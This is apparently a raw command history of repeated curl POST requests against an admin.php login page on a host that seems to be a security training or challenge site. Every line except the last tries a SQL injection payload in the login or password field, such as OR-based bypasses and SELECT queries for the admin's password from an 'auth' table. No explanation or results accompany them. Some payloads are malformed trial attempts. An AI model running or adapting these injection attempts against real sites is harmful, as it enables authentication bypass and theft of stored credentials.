curl -X POST -d "login=admin" -d "password='OR SELECT password FROM auth WHERE login='admin'" http://59902f6.2.sec-l.org/admin.php
curl -X POST -d "login=admin" -d "password='\"OR SELECT password FROM auth WHERE login='admin'" http://59902f6.2.sec-l.org/admin.php
curl -X POST -d "password='\"OR SELECT password FROM auth WHERE login='admin'" http://59902f6.2.sec-l.org/admin.php
curl -X POST -d "login=" -d "password='\"OR SELECT password FROM auth WHERE login='admin'" http://59902f6.2.sec-l.org/admin.php
curl -X POST -d "login=" -d "password='"OR SELECT password FROM auth WHERE login='admin'" http://59902f6.2.sec-l.org/admin.php

"
curl -X POST -d "login=" -d "password='\"OR SELECT password FROM auth WHERE login='admin'" http://59902f6.2.sec-l.org/admin.php
curl -X POST -d "login=" -d "password=\"OR SELECT password FROM auth WHERE login='admin'" http://59902f6.2.sec-l.org/admin.php
curl -X POST -d "login='" -d "password=\"OR SELECT password FROM auth WHERE login='admin'" http://59902f6.2.sec-l.org/admin.php
curl -X POST -d "login=' OR TRUE OR '" -d "password=\"OR SELECT password FROM auth WHERE login='admin'" http://59902f6.2.sec-l.org/admin.php
curl -X POST -d "login=' OR SELECT password FROM auth WHERE login='admin'" -d "password=\"OR SELECT password FROM auth WHERE login='admin'" http://59902f6.2.sec-l.org/admin.php
curl -X POST -d "login=' OR SELECT password FROM auth WHERE login='admin''" -d "password=\"OR SELECT password FROM auth WHERE login='admin'" http://59902f6.2.sec-l.org/admin.php
curl -X POST -d "login=' OR SELECT password FROM auth WHERE login='admin' OR '" -d "password=\"OR SELECT password FROM auth WHERE login='admin'" http://59902f6.2.sec-l.org/admin.php
curl -X POST -d "login=' OR SELECT login FROM auth WHERE login='admin' OR '" -d "password=\"OR SELECT password FROM auth WHERE login='admin'" http://59902f6.2.sec-l.org/admin.php
curl -X POST -d "login=' OR SELECT users FROM auth WHERE login='admin' OR '" -d "password=\"OR SELECT password FROM auth WHERE login='admin'" http://59902f6.2.sec-l.org/admin.php
curl -X POST -d "login=' OR SELECT 1 FROM auth WHERE login='admin' OR '" -d "password=\"OR SELECT password FROM auth WHERE login='admin'" http://59902f6.2.sec-l.org/admin.php
curl -X POST -d "login=' OR SELECT username FROM auth WHERE login='admin' OR '" -d "password=\"OR SELECT password FROM auth WHERE login='admin'" http://59902f6.2.sec-l.org/admin.php
curl -X POST -d "login=' OR SELECT u*FROM auth WHERE login='admin' OR '" -d "password=\"OR SELECT p*FROM auth WHERE login='admin'" http://59902f6.2.sec-l.org/admin.php
curl -X POST -d "login=' OR SELECT u*FROM auth WHERE login='admin' OR '" -d "password=\"OR SELECT * FROM auth WHERE login='admin'" http://59902f6.2.sec-l.org/admin.php
curl -X POST -d "login=' OR SELECT * FROM * WHERE login='admin' OR '" -d "password=\"OR SELECT * FROM * WHERE login='admin'" http://59902f6.2.sec-l.org/admin.php
curl -X POST -d "login=\"OR SELECT * FROM * WHERE login='admin' OR" -d "password=\"OR SELECT * FROM * WHERE login='admin'" http://59902f6.2.sec-l.org/admin.php
curl -X POST -d "login=" -d "password=\"OR SELECT * FROM * WHERE login='admin'" http://59902f6.2.sec-l.org/admin.php
curl -X POST -d "login=" -d "password=" http://59902f6.2.sec-l.org/admin.php
curl -X POST -d "login='" -d "password=" http://59902f6.2.sec-l.org/admin.php
curl -X POST -d "login='" -d "password='" http://59902f6.2.sec-l.org/admin.php
curl -X POST -d "login='" -d "password=' OR SELECT passwordmd5 FROM auth WHERE login='admin'" http://59902f6.2.sec-l.org/admin.php
curl -X POST -d "login='" -d "password=' OR SELECT password FROM auth WHERE login='admin'" http://59902f6.2.sec-l.org/admin.php
curl -X POST -d "login=' OR SELECT login FROM auth WHERE login='admin'" -d "password=' OR SELECT password FROM auth WHERE login='admin'" http://59902f6.2.sec-l.org/admin.php
curl -X POST -d "login='\" OR SELECT login FROM auth WHERE login='admin'" -d "password='\" OR SELECT password FROM auth WHERE login='admin'" http://59902f6.2.sec-l.org/admin.php
curl -X POST -d "login=\" OR SELECT login FROM auth WHERE login='admin'" -d "password=\" OR SELECT password FROM auth WHERE login='admin'" http://59902f6.2.sec-l.org/admin.php
curl -X POST -d "login=\" OR SELECT login,password FROM auth WHERE login='admin'" -d "password=\" OR SELECT passwordmd5 FROM auth WHERE login='admin'" http://59902f6.2.sec-l.org/admin.php
curl -X POST -d "login=\" OR SELECT login FROM auth WHERE login='admin'" -d "password=\" OR SELECT password FROM auth WHERE login='admin'" http://59902f6.2.sec-l.org/admin.php
curl http://59902f6.2.sec-l.org/admin.php
